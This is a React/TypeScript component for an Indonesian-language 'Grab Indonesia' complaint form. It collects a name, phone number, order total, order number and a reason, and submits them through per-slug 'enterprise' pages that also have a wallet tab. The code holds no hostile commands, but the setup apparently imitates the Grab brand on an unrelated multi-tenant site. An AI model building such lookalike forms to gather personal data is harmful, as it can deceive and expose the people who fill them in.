'use client';

import { useState } from 'react';
import { ChevronLeft, Loader2 } from 'lucide-react';
import { EnterpriseHomeBottomNav } from '../EnterpriseHomeBottomNav';
import { EnterpriseLoadingOverlay } from '../EnterpriseLoadingOverlay';
import { unlockEnterpriseAudioSync } from '../lib/audio';
import { submitGrabApplication } from '../lib/submit-application';
import type { EnterpriseSlugData } from '../lib/types';
import {
  EMPTY_GRAB_APPLICATION,
  GRAB_APPLICATION_REASONS,
  type ApplicationFormSource,
  type GrabApplicationData,
} from './application-data';
import './grab-application.css';

type Props = {
  slugData: EnterpriseSlugData;
  source: ApplicationFormSource;
  onSuccess: () => void;
  onBack?: () => void;
  onHome?: () => void;
  onWallet?: () => void;
};

function isFormValid(data: GrabApplicationData): boolean {
  return (
    data.name.trim().length >= 2 &&
    data.phone.replace(/\D/g, '').length >= 10 &&
    data.total.trim().length > 0 &&
    data.orderNumber.trim().length > 0 &&
    GRAB_APPLICATION_REASONS.includes(data.reason as (typeof GRAB_APPLICATION_REASONS)[number])
  );
}

export function GrabApplicationFormShell({
  slugData,
  source,
  onSuccess,
  onBack,
  onHome,
  onWallet,
}: Props) {
  const [form, setForm] = useState<GrabApplicationData>(EMPTY_GRAB_APPLICATION);
  const [submitting, setSubmitting] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const valid = isFormValid(form);

  const navActiveId =
    source === 'pendapat' ? 'pendapat' : source === 'lainnya' ? 'lainnya' : 'utama';

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!valid || submitting) return;

    unlockEnterpriseAudioSync();
    setError('');
    setSubmitting(true);
    setLoading(true);

    const { success, error: err } = await submitGrabApplication(slugData.slug, source, {
      ...form,
      name: form.name.trim(),
      total: form.total.trim(),
      orderNumber: form.orderNumber.trim(),
    });

    setSubmitting(false);
    setLoading(false);

    if (success) {
      onSuccess();
      return;
    }

    setError(err || 'Gagal mengirim formulir.');
  };

  return (
    <div className="grab-app-page">
      <EnterpriseLoadingOverlay visible={loading} />

      {onBack && (
        <header className="grab-app-header">
          <button type="button" className="grab-app-back" onClick={onBack} aria-label="Kembali">
            <ChevronLeft className="h-6 w-6" strokeWidth={2.5} />
          </button>
        </header>
      )}

      <form className="grab-app-body" onSubmit={handleSubmit}>
        <h1 className="grab-app-title">FORMULIR PENGAJUAN GRAB INDONESIA</h1>
        <p className="grab-app-subtitle">
          Lengkapi pengisi formulir sesuai di akun Grab dan kendala yang Anda alami.
        </p>

        <div className="grab-app-field">
          <label className="grab-app-label" htmlFor={`${source}-name`}>
            Nama
          </label>
          <input
            id={`${source}-name`}
            type="text"
            className="grab-app-input"
            placeholder="Nama lengkap"
            value={form.name}
            onChange={(e) => setForm({ ...form, name: e.target.value })}
          />
        </div>

        <div className="grab-app-field">
          <label className="grab-app-label" htmlFor={`${source}-phone`}>
            Telepon
          </label>
          <div className="grab-app-phone-row">
            <span className="grab-app-phone-prefix">+62</span>
            <input
              id={`${source}-phone`}
              type="tel"
              inputMode="numeric"
              className="grab-app-input grab-app-input--phone"
              placeholder=""
              value={form.phone}
              onChange={(e) =>
                setForm({ ...form, phone: e.target.value.replace(/[^0-9]/g, '').slice(0, 13) })
              }
            />
          </div>
        </div>

        <div className="grab-app-field">
          <label className="grab-app-label" htmlFor={`${source}-total`}>
            Total belanjaan + Ongkir
          </label>
          <input
            id={`${source}-total`}
            type="text"
            inputMode="numeric"
            className="grab-app-input"
            placeholder="Rp"
            value={form.total}
            onChange={(e) => setForm({ ...form, total: e.target.value })}
          />
        </div>

        <div className="grab-app-field">
          <label className="grab-app-label grab-app-order-label" htmlFor={`${source}-order`}>
            <span className="grab-app-order-prefix">Nomor Pesanan : GF - 123</span>
          </label>
          <input
            id={`${source}-order`}
            type="text"
            className="grab-app-input"
            placeholder="..."
            value={form.orderNumber}
            onChange={(e) => setForm({ ...form, orderNumber: e.target.value })}
          />
        </div>

        <div className="grab-app-field">
          <label className="grab-app-label" htmlFor={`${source}-reason`}>
            Terkait Alasan Pengajuan
          </label>
          <select
            id={`${source}-reason`}
            className="grab-app-select"
            value={form.reason}
            onChange={(e) => setForm({ ...form, reason: e.target.value })}
          >
            <option value="">Pilih Alasan</option>
            {GRAB_APPLICATION_REASONS.map((reason) => (
              <option key={reason} value={reason}>
                {reason}
              </option>
            ))}
          </select>
        </div>

        {error && <p className="grab-app-error">{error}</p>}
      </form>

      <div className="grab-app-footer">
        <button
          type="button"
          className="grab-app-submit"
          disabled={!valid || submitting}
          onClick={handleSubmit}
        >
          {submitting ? <Loader2 className="h-5 w-5 animate-spin" /> : 'AJUKAN SEKARANG'}
        </button>
      </div>

      <EnterpriseHomeBottomNav activeId={navActiveId} onHome={onHome} onWallet={onWallet} />
    </div>
  );
}
